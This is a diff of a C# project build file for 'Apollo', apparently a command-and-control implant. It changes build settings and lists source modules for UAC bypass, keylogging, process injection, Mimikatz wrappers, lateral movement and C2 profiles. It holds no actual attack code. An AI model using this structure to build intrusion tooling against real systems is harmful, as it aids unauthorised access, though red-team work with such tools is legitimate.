@@ -2,34 +2,17 @@
 <Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
   <PropertyGroup>
-    <ResolveAssemblyReferenceIgnoreTargetFrameworkAttributeVersionMismatch>true</ResolveAssemblyReferenceIgnoreTargetFrameworkAttributeVersionMismatch>
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
-    <ProjectGuid>{D14E4A53-B9B5-4563-8290-BA8487575255}</ProjectGuid>
-    <OutputType>WinExe</OutputType>
+    <ProjectGuid>{F606A86C-39AF-4B5A-B146-F14EDC1D762C}</ProjectGuid>
+    <OutputType>Exe</OutputType>
     <RootNamespace>Apollo</RootNamespace>
     <AssemblyName>Apollo</AssemblyName>
     <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <Deterministic>true</Deterministic>
-    <IsWebBootstrapper>false</IsWebBootstrapper>
-    <TargetFrameworkProfile />
     <NuGetPackageImportStamp>
     </NuGetPackageImportStamp>
-    <PublishUrl>publish\</PublishUrl>
-    <Install>true</Install>
-    <InstallFrom>Disk</InstallFrom>
-    <UpdateEnabled>false</UpdateEnabled>
-    <UpdateMode>Foreground</UpdateMode>
-    <UpdateInterval>7</UpdateInterval>
-    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
-    <UpdatePeriodically>false</UpdatePeriodically>
-    <UpdateRequired>false</UpdateRequired>
-    <MapFileExtensions>true</MapFileExtensions>
-    <ApplicationRevision>0</ApplicationRevision>
-    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
-    <UseApplicationTrust>false</UseApplicationTrust>
-    <BootstrapperEnabled>true</BootstrapperEnabled>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -39,12 +22,7 @@
     <OutputPath>bin\Debug\</OutputPath>
     <DefineConstants>DEBUG;TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
-    <WarningLevel>0</WarningLevel>
-    <RunCodeAnalysis>false</RunCodeAnalysis>
-    <CodeAnalysisIgnoreGeneratedCode>true</CodeAnalysisIgnoreGeneratedCode>
-    <CodeAnalysisRuleSet>MixedRecommendedRules.ruleset</CodeAnalysisRuleSet>
-    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
-    <Prefer32Bit>false</Prefer32Bit>
+    <WarningLevel>4</WarningLevel>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -54,188 +32,99 @@
     <DefineConstants>TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
-    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
-    <Prefer32Bit>false</Prefer32Bit>
-  </PropertyGroup>
-  <PropertyGroup>
-    <StartupObject>
-    </StartupObject>
-  </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
-    <DebugSymbols>true</DebugSymbols>
-    <OutputPath>bin\x64\Debug\</OutputPath>
-    <DefineConstants>DEBUG;TRACE</DefineConstants>
-    <DebugType>full</DebugType>
-    <PlatformTarget>x64</PlatformTarget>
-    <LangVersion>Default</LangVersion>
-    <ErrorReport>prompt</ErrorReport>
-    <CodeAnalysisRuleSet>MixedRecommendedRules.ruleset</CodeAnalysisRuleSet>
-    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
-    <Prefer32Bit>false</Prefer32Bit>
-  </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
-    <OutputPath>bin\x64\Release\</OutputPath>
-    <DefineConstants>TRACE</DefineConstants>
-    <Optimize>true</Optimize>
-    <DebugType>pdbonly</DebugType>
-    <PlatformTarget>x64</PlatformTarget>
-    <LangVersion>Default</LangVersion>
-    <ErrorReport>prompt</ErrorReport>
-    <CodeAnalysisRuleSet>MinimumRecommendedRules.ruleset</CodeAnalysisRuleSet>
-    <Prefer32Bit>false</Prefer32Bit>
-  </PropertyGroup>
-  <PropertyGroup>
-    <AutoGenerateBindingRedirects>false</AutoGenerateBindingRedirects>
-  </PropertyGroup>
-  <PropertyGroup>
-    <ApplicationManifest>app.manifest</ApplicationManifest>
-  </PropertyGroup>
-  <PropertyGroup>
-    <ApplicationIcon>ApolloIcoJPEG.ico</ApplicationIcon>
-  </PropertyGroup>
-  <PropertyGroup>
-    <RunPostBuildEvent>OnOutputUpdated</RunPostBuildEvent>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="Costura, Version=1.6.2.0, Culture=neutral, PublicKeyToken=9919ef960d84173d, processorArchitecture=MSIL">
       <HintPath>..\packages\Costura.Fody.1.6.2\lib\portable-net+sl+win+wpa+wp\Costura.dll</HintPath>
       <Private>False</Private>
     </Reference>
-    <Reference Include="Newtonsoft.Json, Version=12.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
-      <HintPath>..\packages\Newtonsoft.Json.12.0.3\lib\net35\Newtonsoft.Json.dll</HintPath>
-    </Reference>
     <Reference Include="System" />
     <Reference Include="System.Core" />
-    <Reference Include="System.DirectoryServices" />
-    <Reference Include="System.Drawing" />
-    <Reference Include="System.Management" />
     <Reference Include="System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL">
-      <SpecificVersion>False</SpecificVersion>
-      <HintPath>..\..\..\..\..\..\..\..\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll</HintPath>
+      <HintPath>..\packages\Microsoft.PowerShell.5.ReferenceAssemblies.1.1.0\lib\net4\System.Management.Automation.dll</HintPath>
     </Reference>
-    <Reference Include="System.ServiceProcess" />
-    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Security" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
     <Reference Include="System.Data" />
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="CommandModules\BlockDlls.cs" />
-    <Compile Include="CommandModules\BypassUac.cs" />
-    <Compile Include="CommandModules\Inject.cs" />
-    <Compile Include="CommandModules\Keylog.cs" />
-    <Compile Include="CommandModules\LateralMovement\PSExec.cs" />
-    <Compile Include="CommandModules\MimikatzWrappers.cs" />
-    <Compile Include="CommandModules\MoveFile.cs" />
-    <Compile Include="CommandModules\NetDCList.cs" />
-    <Compile Include="CommandModules\NetLocalGroup.cs" />
-    <Compile Include="CommandModules\NetLocalGroupMember.cs" />
-    <Compile Include="CommandModules\NetShares.cs" />
-    <Compile Include="CommandModules\Ppid.cs" />
-    <Compile Include="CommandModules\PrintSpoofer.cs" />
-    <Compile Include="CommandModules\RegistryManager.cs" />
-    <Compile Include="CommandModules\Socks.cs" />
-    <Compile Include="CommandModules\Spawn.cs" />
-    <Compile Include="Evasion\EvasionManager.cs" />
-    <Compile Include="Injection\QueueUserAPCInjection.cs" />
-    <Compile Include="IPC\ScrenshotMessage.cs" />
-    <Compile Include="IPC\KeystrokeMessage.cs" />
-    <Compile Include="Mythic.cs" />
-    <Compile Include="C2Profiles\SMBClientProfile.cs" />
-    <Compile Include="C2Relays\Relay.cs" />
-    <Compile Include="C2Relays\SMBRelay.cs" />
-    <Compile Include="CommandModules\LateralMovement\WMIProcessExecute.cs" />
-    <Compile Include="CommandModules\MakeDirectory.cs" />
-    <Compile Include="Credentials\CredentialManager.cs" />
-    <Compile Include="MythicEncryption\AESPSK.cs" />
-    <Compile Include="Jobs\JobManager.cs" />
-    <Compile Include="Native\Constants.cs" />
-    <Compile Include="Native\Enums.cs" />
-    <Compile Include="Native\Helpers.cs" />
-    <Compile Include="Native\ManagedClasses.cs" />
-    <Compile Include="SacrificialProcesses\SacrificialProcess.cs" />
-    <Compile Include="CommandModules\InjectionManager.cs" />
-    <Compile Include="SocksProxy\Classes\ProxyConnection.cs" />
-    <Compile Include="SocksProxy\SocksController.cs" />
-    <Compile Include="Utils\ADUtils.cs" />
-    <Compile Include="Utils\AuxiliaryClasses.cs" />
-    <Compile Include="Utils\ByteUtils.cs" />
-    <Compile Include="Utils\DebugUtils.cs" />
-    <Compile Include="Injection\InjectionTechnique.cs" />
-    <Compile Include="IPC\PowerShellJobMessage.cs" />
-    <Compile Include="IPC\AssemblyJobMessage.cs" />
-    <Compile Include="IPC\SMBMessage.cs" />
-    <Compile Include="C2Profiles\DefaultProfile.cs" />
-    <Compile Include="Injection\CreateRemoteThreadInjection.cs" />
-    <Compile Include="Jobs\Jobs.cs" />
-    <Compile Include="MessageInbox\Envelope.cs" />
-    <Compile Include="MessageInbox\Inbox.cs" />
-    <Compile Include="C2Profiles\SMBServerProfile.cs" />
-    <Compile Include="Apollo.cs" />
-    <Compile Include="Tasks\Task.cs" />
-    <Compile Include="Agent.cs" />
+    <Compile Include="Agent\Apollo.cs" />
+    <Compile Include="Api\Api.cs" />
+    <Compile Include="Api\Cryptography\RSA.cs" />
+    <Compile Include="Config.cs" />
+    <Compile Include="Management\C2\C2ProfileManager.cs" />
+    <Compile Include="Management\Files\FileManager.cs" />
+    <Compile Include="Management\Identity\IdentityManager.cs" />
+    <Compile Include="Management\Peer\PeerManager.cs" />
+    <Compile Include="Management\Socks\SocksClient.cs" />
+    <Compile Include="Management\Socks\SocksManager.cs" />
+    <Compile Include="Peers\SMB\SMBPeer.cs" />
+    <Compile Include="Peers\TCP\TCPPeer.cs" />
+    <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
-    <Compile Include="Utils\Exceptions.cs" />
-    <Compile Include="Utils\FileUtils.cs" />
-    <Compile Include="Utils\PathUtils.cs" />
-    <Compile Include="Utils\ReflectionUtils.cs" />
-    <Compile Include="Utils\RegistryUtils.cs" />
-    <Compile Include="Utils\ServiceUtils.cs" />
-    <Compile Include="Utils\StringUtils.cs" />
-    <Compile Include="CommandModules\Cat.cs" />
-    <Compile Include="CommandModules\Jobs.cs" />
-    <Compile Include="CommandModules\Kill.cs" />
-    <Compile Include="CommandModules\LinkManager.cs" />
-    <Compile Include="CommandModules\Mimikatz.cs" />
-    <Compile Include="CommandModules\PivotManager.cs" />
-    <Compile Include="CommandModules\PrintWorkingDirectory.cs" />
-    <Compile Include="CommandModules\Process.cs" />
-    <Compile Include="CommandModules\ChangeDir.cs" />
-    <Compile Include="CommandModules\DirectoryList.cs" />
-    <Compile Include="CommandModules\Download.cs" />
-    <Compile Include="CommandModules\AssemblyManager.cs" />
-    <Compile Include="CommandModules\Exit.cs" />
-    <Compile Include="CommandModules\PowerShellManager.cs" />
-    <Compile Include="CommandModules\ProcessList.cs" />
-    <Compile Include="CommandModules\Remove.cs" />
-    <Compile Include="CommandModules\Screenshot.cs" />
-    <Compile Include="CommandModules\Shellcode.cs" />
-    <Compile Include="CommandModules\Sleep.cs" />
-    <Compile Include="CommandModules\SpawnTo.cs" />
-    <Compile Include="CommandModules\TokenManager.cs" />
-    <Compile Include="CommandModules\Upload.cs" />
-    <Compile Include="Native\Methods.cs" />
-    <Compile Include="Native\Structures.cs" />
-    <Compile Include="Native\Win32Error.cs" />
-    <Compile Include="Utils\WMIUtils.cs" />
+    <Compile Include="Management\Tasks\TaskManager.cs" />
   </ItemGroup>
   <ItemGroup>
-    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
-      <Visible>False</Visible>
-      <ProductName>.NET Framework 3.5 SP1</ProductName>
-      <Install>true</Install>
-    </BootstrapperPackage>
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="app.config" />
-    <EmbeddedResource Include="app.manifest" />
-    <None Include="Caramel.json" />
-    <Compile Include="CommandModules\CopyFile.cs" />
-    <None Include="packages.config" />
+    <ProjectReference Include="..\ApolloInterop\ApolloInterop.csproj">
+      <Project>{5b5bd587-7dca-4306-b1c3-83a70d755f37}</Project>
+      <Name>ApolloInterop</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\DInvokeResolver\DInvokeResolver.csproj">
+      <Project>{2c98a07c-f4cd-486c-bbab-eb6b6cde1a35}</Project>
+      <Name>DInvokeResolver</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\EncryptedFileStore\EncryptedFileStore.csproj">
+      <Project>{21b9b3fa-acbf-4ed2-a0bb-2782e708f6f9}</Project>
+      <Name>EncryptedFileStore</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\HttpProfile\HttpProfile.csproj">
+      <Project>{74b393f3-4000-49ac-8116-dccdb5f52344}</Project>
+      <Name>HttpProfile</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Injection\Injection.csproj">
+      <Project>{e4724425-fc2d-40ae-9506-553d5d9dd929}</Project>
+      <Name>Injection</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\NamedPipeProfile\NamedPipeProfile.csproj">
+      <Project>{3af39094-7f42-4444-a278-fa656eb4678f}</Project>
+      <Name>NamedPipeProfile</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\PlaintextCrypto\PlaintextCryptography.csproj">
+      <Project>{ed320ce0-c28f-4b07-a353-9b14c261e8a3}</Project>
+      <Name>PlaintextCryptography</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Process\Process.csproj">
+      <Project>{6008a59e-80a4-4790-8fe3-01de201d71b3}</Project>
+      <Name>Process</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\PSKCrypto\PSKCryptography.csproj">
+      <Project>{c8fc8d87-30db-4fc5-880a-9cd7d156127a}</Project>
+      <Name>PSKCryptography</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\SimpleResolver\SimpleResolver.csproj">
+      <Project>{6ca1ff03-8102-41d5-9d57-cc2da346d684}</Project>
+      <Name>SimpleResolver</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Tasks\Tasks.csproj">
+      <Project>{b9bda393-c258-44d3-8266-d62265008bd4}</Project>
+      <Name>Tasks</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\TcpProfile\TcpProfile.csproj">
+      <Project>{add40b1e-3c2e-4046-b574-fa0ed70fc64d}</Project>
+      <Name>TcpProfile</Name>
+    </ProjectReference>
   </ItemGroup>
   <ItemGroup>
     <None Include="FodyWeavers.xml" />
   </ItemGroup>
   <ItemGroup>
-    <Content Include="ApolloIcoJPEG.ico" />
+    <None Include="packages.config" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
-  <ProjectExtensions />
-  <PropertyGroup>
-    <PostBuildEvent>
-    </PostBuildEvent>
-  </PropertyGroup>
   <Import Project="..\packages\Fody.2.0.0\build\portable-net+sl+win+wpa+wp\Fody.targets" Condition="Exists('..\packages\Fody.2.0.0\build\portable-net+sl+win+wpa+wp\Fody.targets')" />
   <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
     <PropertyGroup>
